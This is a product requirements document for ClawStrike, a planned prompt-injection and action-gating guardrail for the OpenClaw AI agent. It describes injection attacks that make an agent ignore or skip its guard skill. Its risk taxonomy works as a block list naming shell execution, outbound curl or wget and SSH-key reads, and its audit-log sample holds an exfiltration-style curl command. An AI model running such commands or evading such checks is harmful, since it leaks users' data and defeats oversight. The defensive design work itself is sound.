# ClawStrike — Product Requirements Document

## AI Agent Security Guardrails for OpenClaw

**Version:** 0.1 (Draft)
**Author:** Abed
**Date:** February 2026
**Status:** Pre-MVP

---

## 1. Problem Statement

OpenClaw is a fast-growing open-source personal AI agent with 140k+ GitHub stars, full local system access, shell execution, email/calendar integration, self-modifiable skills, and multi-channel inputs (WhatsApp, Telegram, Signal, Discord, email, and more). It is deployed on personal machines and increasingly on corporate endpoints.

The security posture is critically underdeveloped:

- OpenClaw's own documentation admits there is no "perfectly secure" setup.
- Cisco's AI security team found that 26% of 31,000 agent skills analyzed contained at least one vulnerability, and demonstrated a third-party skill performing silent data exfiltration via prompt injection.
- CrowdStrike has flagged that misconfigured instances could be commandeered as AI backdoor agents.
- The ClawHub skill registry lacks adequate vetting for malicious submissions.
- Multi-channel input surfaces (email bodies, group chats, webhook data) create indirect prompt injection vectors with no source-level trust differentiation.

There is no existing security guardrails product that OpenClaw users can install to protect their agent runtime. Enterprise vendors (CrowdStrike, Cisco) offer detection and visibility for their customers, but nothing exists at the agent layer itself.

**ClawStrike fills this gap.** It is a security guardrails layer that detects prompt injection attacks, enforces source-aware trust policies, gates high-risk actions before execution, and provides a full audit trail — all integrated directly into the OpenClaw runtime.

---

## 2. Target Users

### Primary: OpenClaw Power Users & Self-Hosters

Developers and technical users running OpenClaw on personal or work machines who have granted the agent access to sensitive systems (email, shell, file system, calendars). They understand the risk surface but lack tooling to mitigate it without giving up functionality.

### Secondary: Security-Conscious Organizations

Teams where employees have deployed OpenClaw (often informally, outside IT governance). These organizations need a lightweight guardrail that can be applied at the agent level without requiring enterprise-grade SIEM integration.

### Tertiary: OpenClaw Skill Developers

Developers building and distributing skills via ClawHub who want to validate that their skills do not introduce security vulnerabilities.

---

## 3. Architecture Overview

ClawStrike's architecture is designed in two phases, reflecting a deliberate tradeoff between time-to-value and enforcement strength.

The **MVP ships with Skill Mode only** — a lightweight, advisory integration that validates the core detection and trust logic with minimal engineering overhead. **Proxy Mode ships in Phase 1.5** as an enforcement upgrade once the core guardrails have been validated against real-world usage.

### 3.1 Skill Mode (Advisory) — MVP

- **Integration method:** User installs a ClawStrike skill via ClawHub. The skill's system prompt instructs OpenClaw to route inputs and outputs through ClawStrike before acting. ClawStrike runs as an **MCP (Model Context Protocol) server** exposing `classify` and `gate` as callable tools. OpenClaw connects to the ClawStrike MCP server, and the skill instructs the LLM to call these tools at the appropriate points in its workflow. The default transport is **stdio** (standard for local MCP integrations).
- **Enforcement model:** Best-effort, advisory only. The LLM is asked to voluntarily comply with ClawStrike's assessments. A sufficiently advanced prompt injection can instruct the LLM to ignore the ClawStrike skill.
- **What this validates:** Classifier accuracy, trust tier logic, threshold tuning, contact registry behavior, audit logging, and the overall user experience. These are the core capabilities that must work correctly before enforcement mode adds value.
- **Limitations:** Not a security boundary. The LLM can be instructed to bypass the skill. Action gating is advisory — ClawStrike recommends blocking, but the LLM decides whether to comply. Effective against unsophisticated attacks; insufficient for high-risk deployments.

### 3.2 Proxy Mode (Enforcement) — Phase 1.5

- **Integration method:** ClawStrike runs as a middleware proxy that intercepts all LLM API calls between the OpenClaw gateway and the upstream LLM provider. Configured by pointing OpenClaw's LLM API base URL to the ClawStrike proxy.
- **Enforcement model:** True enforcement. ClawStrike inspects every inbound prompt and every outbound tool call before they reach the LLM or the execution layer. Blocked content never reaches the model or the system.
- **What this adds over Skill Mode:** Deterministic action gating (structured tool call parsing instead of LLM-reported actions), bypass-proof enforcement (interception happens outside the LLM context), and full visibility into the LLM interaction stream.
- **Engineering scope:** SSE streaming passthrough, tool call response buffering, TLS/certificate handling, partial tool call blocking from multi-tool responses, upstream failure handling.
- **Use case:** Recommended for any deployment handling sensitive data or with access to destructive system capabilities.

```
┌─────────────────────────────────────────────────────────────────────┐
│                   SKILL MODE (Advisory) — MVP                       │
│                                                                     │
│  User ──► OpenClaw Gateway ──► LLM ──► OpenClaw Executor            │
│               │                 ▲                                   │
│               ▼                 │                                   │
│        ClawStrike Skill ────────┘                                   │
│           │                                                         │
│           ▼  (MCP tool calls via stdio)                             │
│     ClawStrike MCP Server                                           │
│     ┌─────────────────┐                                             │
│     │  classify tool   │                                            │
│     │  gate tool       │                                            │
│     │  health tool     │                                            │
│     ├─────────────────┤                                             │
│     │  Core Modules:   │                                            │
│     │  Classifier      │                                            │
│     │  Trust Engine    │                                            │
│     │  Gating Engine   │                                            │
│     │  Audit Logger    │                                            │
│     └─────────────────┘                                             │
└─────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────┐
│               PROXY MODE (Enforcement) — Phase 1.5                  │
│                                                                     │
│  User ──► OpenClaw Gateway ──► ClawStrike Proxy ──► LLM            │
│                                  │        ▲                         │
│                                  │        │                         │
│                                  ▼        │                         │
│                             ┌─────────────────┐                     │
│                             │  Input Guardrail │                    │
│                             │  Trust Tier Eval │                    │
│                             │  Action Gating   │                    │
│                             │  Audit Logger    │                    │
│                             └─────────────────┘                     │
│                                                                     │
│  LLM Response ──► ClawStrike Proxy ──► Action Gate ──► Executor     │
│                     (tool call                (approve / block /     │
│                      interception)             prompt user)          │
└─────────────────────────────────────────────────────────────────────┘
```

---

## 4. MVP Feature Set (Skill Mode)

> **Scope:** All MVP features operate through the Skill Mode integration. ClawStrike runs as a local **MCP server** (via fastmcp, stdio transport). The ClawStrike skill installed in OpenClaw instructs the LLM to call ClawStrike's MCP tools (`classify`, `gate`) for classification, trust evaluation, and advisory action gating. All guardrail decisions are advisory — the LLM is instructed to comply but is not mechanically forced to. Enforcement-grade gating ships in Phase 1.5 (Proxy Mode).

### 4.1 Prompt Injection Detection

**Purpose:** Classify inbound content for prompt injection attacks before it reaches the LLM or influences agent behavior.

**Model Selection:**
ClawStrike supports pluggable classifier backends. The user selects one model via configuration. Two models are supported at launch:

| Model | Params | Languages | Strengths | Best For |
|---|---|---|---|---|
| Llama Prompt Guard 2 (86M) | 86M | Multilingual | Fine-tunable per use case, broad language coverage | Multilingual deployments, custom fine-tuning |
| protectai/deberta-v3-small-prompt-injection-v2 | ~44M | English | Lightweight, fast inference | English-only, latency-sensitive setups |

**Configuration:**

```yaml
clawstrike:
  classifier:
    model: "prompt-guard-2"  # or "deberta-v3" or "custom"
    custom_model_path: null   # path to user-provided model
    threshold:
      block: 0.92            # hard block above this score
      flag: 0.70             # flag for review / elevated scrutiny
    run_mode: "local"         # "local" or "api"
```

**Behavior:**
- The ClawStrike skill instructs the LLM to call the `classify` MCP tool with every inbound message before acting on it.
- Score ≥ `block` threshold → the tool returns a block recommendation. The skill instructs the LLM to reject the input. The event is logged and the user is notified via the originating channel.
- Score ≥ `flag` threshold → the tool returns a flag recommendation. The skill instructs the LLM to proceed with caution and report planned actions before executing them (elevated scrutiny).
- Score < `flag` → the tool returns a pass. Normal processing continues.
- **Advisory limitation:** In skill mode, classification results are recommendations that the LLM is instructed to follow. A sophisticated prompt injection could instruct the LLM to ignore the skill's guidance. Enforcement-grade blocking (where the classified input never reaches the LLM) ships in Phase 1.5 with Proxy Mode.

**Classifier Interface (internal):**

```python
class ClassifierResult:
    score: float          # 0.0 - 1.0, probability of injection
    label: str            # "benign" | "injection" | "jailbreak"
    model: str            # identifier of the model that produced this result
    latency_ms: float

class BaseClassifier(ABC):
    @abstractmethod
    def classify(self, text: str, metadata: SourceMetadata) -> ClassifierResult:
        ...
```

This interface allows future addition of custom or fine-tuned models without architectural changes.

---

### 4.2 Source-Aware Trust Tiers

**Purpose:** Differentiate security posture based on where an input originates. An owner DM on Signal is not the same as an unsolicited email body being processed by OpenClaw.

**Three components:**

#### 4.2.1 Channel Trust Levels (Static Configuration)

A static mapping from input channel type to a base trust level, configured once by the user.

```yaml
clawstrike:
  trust:
    channel_defaults:
      owner_dm:      high      # Direct message from the owner account
      trusted_group: medium    # Pre-approved group chats
      public_group:  low       # Open/public group channels
      email_body:    low       # Content from inbound emails
      webhook:       untrusted # API/webhook-sourced input
      skill_input:   untrusted # Data injected via skill execution
```

Trust levels: `high`, `medium`, `low`, `untrusted`.

#### 4.2.2 Contact Registry (Dynamic, Local Store)

A lightweight local database (SQLite) tracking known contacts and their interaction history.

**Schema:**

```sql
CREATE TABLE contacts (
    source_id     TEXT PRIMARY KEY,  -- normalized identifier (email, phone, discord ID)
    channel_type  TEXT NOT NULL,     -- channel through which first seen
    display_name  TEXT,
    trust_level   TEXT DEFAULT 'auto', -- 'auto' | 'trusted' | 'blocked' (manual override)
    first_seen    TIMESTAMP NOT NULL,
    last_seen     TIMESTAMP NOT NULL,
    interaction_count INTEGER DEFAULT 1
);
```

**Behavior:**
- On first contact from an unknown source: assign `untrusted` status, log the event, apply maximum scrutiny thresholds for this session.
- Interaction count increments over time. After a configurable threshold (e.g., 5 interactions without incidents), auto-promote to the channel's default trust level.
- Owner can manually trust or block contacts via a ClawStrike command (e.g., `/clawstrike trust <source_id>` or `/clawstrike block <source_id>`).

#### 4.2.3 Trust-Modulated Classifier Thresholds

The classifier's effective thresholds are adjusted based on the resolved trust level of the source.

```yaml
clawstrike:
  trust:
    threshold_modifiers:
      high:       { block: +0.05, flag: +0.10 }  # more lenient
      medium:     { block: 0.00,  flag: 0.00  }   # baseline
      low:        { block: -0.05, flag: -0.10 }   # stricter
      untrusted:  { block: -0.10, flag: -0.20 }   # most strict
```

Example: baseline `block` = 0.92. An untrusted source hits `block` at 0.82. A high-trust owner DM hits `block` at 0.97.

**Content-source mismatch signal:** If a high-trust contact sends content that scores above the `flag` threshold, this is flagged as anomalous — potential account compromise or relayed content. The trust level for that session is temporarily downgraded to `low`.

---

### 4.3 Action Gating (Advisory)

**Purpose:** Evaluate agent actions and recommend whether they should proceed, be blocked, or require user confirmation. In the MVP, action gating is advisory — the ClawStrike skill instructs the LLM to report planned actions and comply with gating recommendations, but the LLM is not mechanically prevented from executing.

**Design model:** Inspired by Claude Code's confirmation UX. Actions are classified by risk, and the recommendation to allow, block, or prompt the user is determined by the combination of action risk and session trust level.

**Advisory limitation:** In skill mode, action extraction depends on the LLM voluntarily reporting what it plans to do. This is inherently less reliable than proxy mode's structured tool call parsing. The LLM may omit actions, misreport them, or be instructed by an injection to skip reporting entirely. This is an accepted tradeoff for the MVP — the goal is to validate the gating logic, taxonomy, and UX before investing in enforcement-grade interception (Phase 1.5).

#### 4.3.1 Action Risk Taxonomy (MVP — Hardcoded)

| Risk Level | Action Category | Examples |
|---|---|---|
| **Critical** | Shell execution | `exec`, `spawn`, `system`, `child_process` |
| **Critical** | Outbound network to unknown hosts | `curl`, `wget`, `fetch` to non-allowlisted domains |
| **Critical** | Skill installation / modification | ClawHub install, skill file writes |
| **Critical** | Cron job creation / modification | Scheduled task creation |
| **High** | Email / message sending | Outbound emails, Slack/Discord messages on behalf of user |
| **High** | File system writes outside sandbox | Writes to `~`, `/etc`, or other sensitive paths |
| **High** | Calendar / contact modification | Event creation, contact edits |
| **Medium** | File system reads of sensitive files | Reading `.env`, config files, SSH keys |
| **Medium** | Web browsing / navigation | Visiting URLs, form submissions |
| **Low** | Read-only operations | `ls`, `cat` on non-sensitive paths, calendar reads |

#### 4.3.2 Gating Decision Matrix

|  | High Trust | Medium Trust | Low Trust | Untrusted |
|---|---|---|---|---|
| **Critical** | Prompt user | Block | Block | Block |
| **High** | Auto-allow | Prompt user | Block | Block |
| **Medium** | Auto-allow | Auto-allow | Prompt user | Block |
| **Low** | Auto-allow | Auto-allow | Auto-allow | Prompt user |

"Prompt user" means the skill instructs the LLM to pause and ask the owner for confirmation via the originating channel, including the action description, source information, and a one-tap approve/deny response. "Block" means the skill instructs the LLM not to proceed. In both cases, compliance depends on the LLM following the skill's instructions.

> **Phase 1.5 upgrade:** In Proxy Mode, "Block" mechanically strips the tool call from the LLM response before it reaches OpenClaw's executor, and "Prompt user" holds the response until approval is received. No LLM compliance required.

#### 4.3.3 Action Allowlisting (Learn Over Time)

When a user approves a prompted action, they can optionally mark it as "always allow for this source" or "always allow globally." This creates a stored policy rule.

```sql
CREATE TABLE action_allowlist (
    id            INTEGER PRIMARY KEY AUTOINCREMENT,
    action_type   TEXT NOT NULL,         -- e.g., "shell_exec", "send_email"
    action_pattern TEXT,                 -- optional: regex or glob for specifics (e.g., "curl https://api.mycompany.com/*")
    source_scope  TEXT NOT NULL,         -- "global" | specific source_id
    created_at    TIMESTAMP NOT NULL,
    created_by    TEXT NOT NULL          -- "owner" (manual approval)
);
```

Over time, the gating becomes less intrusive for the user's normal workflows while maintaining strict controls for novel or untrusted actions.

#### 4.3.4 Action Extraction (Skill Mode)

In skill mode, action extraction depends on the LLM reporting its planned actions to the ClawStrike skill before executing them. The skill's system prompt instructs the LLM to call the `gate` MCP tool with each planned action and await ClawStrike's recommendation. The `gate` tool parses the LLM-reported action description and matches it against the risk taxonomy using keyword matching and pattern rules.

**Known limitations:**
- The LLM may omit, underreport, or mischaracterize actions.
- A prompt injection could instruct the LLM to skip the reporting step entirely.
- Complex multi-step actions may be reported as a single high-level description, missing risky sub-steps.

These limitations are accepted for the MVP. The audit log captures what was reported vs. what was recommended, providing data to assess the gap between LLM-reported and actual actions.

> **Phase 1.5 upgrade:** In Proxy Mode, tool calls are structured JSON objects in the LLM response. ClawStrike parses the tool call name and arguments directly from the API response before passing them to OpenClaw's executor. This is reliable, deterministic, and cannot be bypassed by the LLM.

**MVP scope note:** The initial action taxonomy is hardcoded. A future version may support user-defined risk rules and more granular action patterns.

---

### 4.4 Audit Log

**Purpose:** Record every security-relevant decision for forensic analysis, incident response, and classifier improvement.

**Every event logged includes:**

```json
{
  "timestamp": "2026-02-20T14:32:01Z",
  "event_type": "input_classification | action_gate | trust_update | config_change",
  "session_id": "uuid",
  "source": {
    "source_id": "user@example.com",
    "channel_type": "email_body",
    "trust_level": "untrusted",
    "is_first_contact": true
  },
  "classifier": {
    "model": "prompt-guard-2",
    "score": 0.87,
    "label": "injection",
    "threshold_applied": { "block": 0.82, "flag": 0.52 },
    "decision": "flag"
  },
  "action_gate": {
    "action_type": "shell_exec",
    "action_detail": "curl https://unknown-domain.com/collect?data=...",
    "risk_level": "critical",
    "decision": "block",
    "user_prompted": false
  },
  "raw_input_hash": "sha256:...",
  "raw_input_snippet": "first 200 chars (configurable, can be disabled for privacy)"
}
```

**Storage:** Local SQLite database with configurable retention (default: 90 days). Sensitive content (raw inputs) can be hashed-only via a privacy configuration flag.

**CLI access:**

```bash
clawstrike logs --last 24h
clawstrike logs --source "user@example.com"
clawstrike logs --event-type action_gate --decision block
clawstrike logs --export csv --output ./audit-export.csv
```

---

## 5. Phase 1.5 — Proxy Mode & Enforcement-Grade Gating

Phase 1.5 upgrades ClawStrike from an advisory skill to an enforcement layer by introducing Proxy Mode. This is the immediate follow-on to the MVP, built once the core guardrails (classifier, trust tiers, audit log) have been validated against real-world usage.

### 5.1 Proxy Mode Runtime

- ClawStrike runs as an HTTP proxy (FastAPI + uvicorn) that intercepts all LLM API calls between the OpenClaw gateway and the upstream LLM provider. FastAPI is introduced in this phase — the MVP uses only the MCP server.
- Configured by pointing OpenClaw's `LLM_API_BASE_URL` to `http://localhost:<clawstrike_port>`.
- Must handle SSE streaming passthrough for non-tool-call responses (text tokens streamed through with no buffering).
- Tool-call responses are buffered in full to allow structured parsing and gating before forwarding to OpenClaw.
- Upstream LLM failures are passed through to OpenClaw unchanged (ClawStrike does not mask upstream errors).

### 5.2 Enforcement-Grade Action Gating

- Tool calls are parsed from the structured JSON in the LLM response — deterministic, no LLM cooperation required.
- The gating decision matrix (Section 4.3.2) is applied mechanically: blocked actions are stripped from the response before it reaches OpenClaw. Prompted actions hold the response until user approval.
- Partial tool call blocking: if an LLM response contains multiple tool calls, only the blocked/prompted calls are held or stripped. Approved tool calls are forwarded immediately.

### 5.3 Technical Investigations (Required Before Implementation)

- **TLS/certificate handling:** Determine whether OpenClaw accepts a custom CA cert or an HTTP base URL for local proxying. This determines whether ClawStrike needs to handle TLS termination.
- **OpenClaw tool call schema:** Document the exact JSON structure of tool calls in OpenClaw's LLM API interactions. Build a versioned parser that can be updated as the schema evolves.
- **Streaming behavior:** Test how OpenClaw handles delayed or buffered responses to ensure the tool-call buffering approach doesn't cause timeouts or unexpected behavior.

---

## 6. Phase 2 Roadmap

### 6.1 LLM-as-Judge (Semantic Intent Coherence)

**Trigger conditions (targeted, not universal):**
- Action is flagged as high-risk AND source trust is `low` or `untrusted`, OR
- Classifier score falls in the ambiguous zone (above `flag`, below `block`), OR
- A content-source mismatch anomaly has been detected in the session.

**Behavior:** An LLM call evaluates whether the agent's planned action is coherent with the original user intent. Returns an alignment score and a natural language rationale.

**Deployment:** Optional per-user configuration. Can replace or complement user confirmation prompts for action gating. Intended to reduce confirmation fatigue for users with high-volume workflows from mixed-trust sources.

**Architecture note:** The action gating pipeline (MVP) should include a hook point where an async judge can be invoked before the confirmation recommendation fires. This interface should be defined in the MVP even though the judge implementation ships in Phase 2.

### 6.2 Skill Scanner

**Purpose:** Static analysis of ClawHub skills before installation.

**Scope:**
- Parse skill definitions for shell commands, network calls, file system access, and embedded prompt injection payloads.
- Flag skills that request excessive permissions relative to their stated purpose.
- Integrate with ClawHub to provide a trust score per skill.

**Rationale:** Cisco's research demonstrated that the skill registry is one of the largest attack vectors. A pre-install scanner addresses the supply chain risk that neither the classifier nor action gating fully covers.

### 6.3 Output Guardrails

**Purpose:** Detect PII, credentials, and sensitive data in outbound content before the agent sends emails, messages, or API calls.

**Approach:** Wrap existing libraries (e.g., Microsoft Presidio) rather than building from scratch. Focus ClawStrike's original work on integration with the action gating layer — PII detection becomes an additional signal in the action gate decision for outbound actions.

### 6.4 Exfiltration Detection

**Purpose:** Flag outbound actions that move sensitive data to anomalous or unknown destinations.

**Approach:** Maintain a baseline of normal outbound targets (domains, email addresses, API endpoints) and flag deviations. Combine with action gating to block or prompt on suspicious outbound patterns.

---

## 7. Configuration Reference

All configuration lives in a single YAML file (`clawstrike.yaml`) in the user's ClawStrike directory.

```yaml
clawstrike:
  # MVP: Only skill mode is supported. Proxy mode ships in Phase 1.5.
  mode: "skill"

  # MVP: MCP server configuration (stdio transport, used by OpenClaw skill)
  mcp:
    transport: "stdio"          # "stdio" (MVP default) or "http" (Phase 1.5)

  # Phase 1.5 (not active in MVP)
  proxy:
    listen_port: 8019           # Port for the ClawStrike proxy/HTTP API
    upstream_llm_url: "https://api.anthropic.com/v1"
    # When mode is "proxy", OpenClaw points its LLM base URL to http://localhost:8019

  classifier:
    model: "prompt-guard-2"   # "prompt-guard-2" | "deberta-v3" | "custom"
    custom_model_path: null
    run_mode: "local"          # "local" | "api"
    threshold:
      block: 0.92
      flag: 0.70

  trust:
    channel_defaults:
      owner_dm:      high
      trusted_group: medium
      public_group:  low
      email_body:    low
      webhook:       untrusted
      skill_input:   untrusted
    threshold_modifiers:
      high:       { block: +0.05, flag: +0.10 }
      medium:     { block: 0.00,  flag: 0.00 }
      low:        { block: -0.05, flag: -0.10 }
      untrusted:  { block: -0.10, flag: -0.20 }
    auto_promote_after: 5      # interactions before auto-promoting to channel default

  action_gating:
    enabled: true
    confirmation_channel: "owner_dm"  # where to send approval prompts
    allowlist_learning: true           # allow users to create rules from approvals

  audit:
    enabled: true
    retention_days: 90
    log_raw_input: true         # false = hash-only mode
    raw_input_max_chars: 200
    db_path: "./data/audit.db"

  # Phase 2 (preview, not active in MVP or Phase 1.5)
  llm_judge:
    enabled: false
    model: "claude-sonnet-4-5-20250929"
    trigger: "high_risk_untrusted"  # or "ambiguous_score" or "both"
```

---

## 8. Technical Stack (MVP)

- **Language:** Python 3.12+
- **Package manager:** uv (dependency management, lockfile, virtual environments)
- **MCP server:** fastmcp v3 (MCP tool interface for OpenClaw integration, stdio transport)
- **Classifier inference:** Hugging Face Transformers + PyTorch (model loading, tokenization, inference)
- **Data storage:** SQLite via aiosqlite (contact registry, audit log, action allowlist)
- **CLI:** Typer (commands: `start`, `logs`, `allowlist`, `trust`, `block`)
- **Configuration:** Pydantic v2 + PyYAML (typed config schema with validation)
- **Logging:** structlog (structured JSON logging, pairs with audit events)
- **Testing:** pytest + pytest-asyncio (unit, integration, E2E)
- **Lint/format:** ruff (replaces flake8, isort, black)
- **Project layout:** src layout (`src/clawstrike/`) with pyproject.toml

> **Note:** FastAPI is not used in the MVP. The MCP server handles the OpenClaw integration, and the CLI calls core modules directly. FastAPI is introduced in Phase 1.5 for the proxy mode HTTP layer.

### 8.1 Project Structure

```
src/clawstrike/
├── __init__.py
├── server.py                  # FastMCP server — classify, gate, health tools
├── cli.py                     # Typer app — start, logs, trust, allowlist, block
├── config.py                  # Pydantic config models, YAML loading
├── db.py                      # SQLite connection manager, schema init, migrations
├── classifier/
│   ├── __init__.py
│   ├── base.py                # BaseClassifier ABC, ClassifierResult model
│   ├── prompt_guard.py        # Llama Prompt Guard 2 implementation
│   └── deberta.py             # DeBERTa v3 implementation
├── trust/
│   ├── __init__.py
│   ├── engine.py              # Trust resolution, threshold modulation, mismatch detection
│   └── contacts.py            # Contact registry CRUD (SQLite)
├── gating/
│   ├── __init__.py
│   ├── engine.py              # Gating decision matrix, elevated scrutiny logic
│   ├── taxonomy.py            # Hardcoded action risk taxonomy
│   └── allowlist.py           # Allowlist CRUD (SQLite)
├── audit/
│   ├── __init__.py
│   └── logger.py              # Audit event writing, querying, retention cleanup
└── models.py                  # Shared Pydantic models (SourceMetadata, GateRequest, etc.)
skills/
└── clawstrike/                # OpenClaw skill definition + README
tests/
├── conftest.py
├── test_config.py
├── test_classifier/
├── test_trust/
├── test_gating/
├── test_audit/
├── test_server.py             # MCP tool integration tests
└── test_e2e.py                # End-to-end scenario tests
```

---

## 9. Technical Constraints & Assumptions

- **OpenClaw version:** Architecture assumes the current OpenClaw gateway + skill system with MCP support. The ClawStrike skill calls ClawStrike's MCP tools, so OpenClaw internal changes are unlikely to break the integration unless the skill system or MCP support itself changes.
- **Latency budget:** Classifier inference must complete in <100ms for local mode to avoid perceptible delay in agent responsiveness. Advisory action gating decision must complete in <50ms. These budgets apply to the MCP tool call round trip (including stdio transport overhead).
- **Advisory enforcement:** All MVP guardrail decisions are advisory — the LLM is instructed to comply via the skill's system prompt but is not mechanically forced. This is an accepted limitation documented for users. Enforcement-grade gating ships in Phase 1.5.
- **Local-first:** All data (contact registry, audit logs, allowlists, classifier models) is stored locally. No cloud dependency in the default configuration.
- **No root required:** ClawStrike runs in userspace alongside OpenClaw. It does not require elevated privileges.
- **Model hosting:** Local classifier inference requires a machine capable of running the selected model. Minimum: 8GB RAM for Prompt Guard 2, 4GB for DeBERTa. GPU optional but recommended.

---

## 10. Success Metrics

| Metric | Target | Measurement |
|---|---|---|
| Prompt injection detection rate | >95% on known attack datasets | Benchmark against existing PI datasets + custom OpenClaw-specific test suite |
| False positive rate | <5% on benign OpenClaw interactions | Measured against a corpus of normal OpenClaw usage logs |
| Classification latency (local) | <100ms p95 | Instrumented in audit log |
| Advisory gating compliance rate | >80% LLM compliance with skill recommendations | Measure how often the LLM follows block/prompt recommendations vs. ignores them (informs Phase 1.5 urgency) |
| MVP install-to-working time | <15 minutes | Timed onboarding tests |

---

## 11. Open Questions

1. **OpenClaw governance transition:** With Steinberger joining OpenAI and the project moving to a foundation, will the foundation build native security features? ClawStrike should be positioned as complementary (defense-in-depth) rather than competing with upstream.
2. **Skill system reliability:** How reliably does OpenClaw's skill system forward requests to external APIs? Are there cases where the LLM bypasses installed skills? This directly affects MVP effectiveness and should be tested early in development.
3. **LLM compliance with advisory gating:** How often do different LLMs (Claude, GPT, DeepSeek) follow the skill's instructions to block or prompt on flagged actions? If compliance is low for certain models, this increases the urgency of Phase 1.5 Proxy Mode. Track this as a success metric.
4. **Proxy mode TLS interception (Phase 1.5):** If OpenClaw uses TLS to communicate with the LLM API, the proxy will need to handle certificate management. Investigate whether OpenClaw's config allows specifying a custom CA certificate or if it accepts an HTTP base URL for local proxying.
5. **Action extraction completeness:** The hardcoded action taxonomy covers known OpenClaw tool call types. As the skill ecosystem grows, new action types may emerge that aren't in the taxonomy. The audit log will help identify gaps by surfacing unclassified actions.
6. **Multi-agent routing:** OpenClaw supports routing inbound channels to isolated agents (workspaces). ClawStrike's trust and gating policies may need to be per-workspace in future versions.
7. **Performance on resource-constrained machines:** Users running OpenClaw on low-spec machines (e.g., Raspberry Pi, older laptops) may not have headroom for local classifier inference. Consider a lightweight mode that uses heuristic-only detection (regex patterns, known payload signatures) as a fallback.
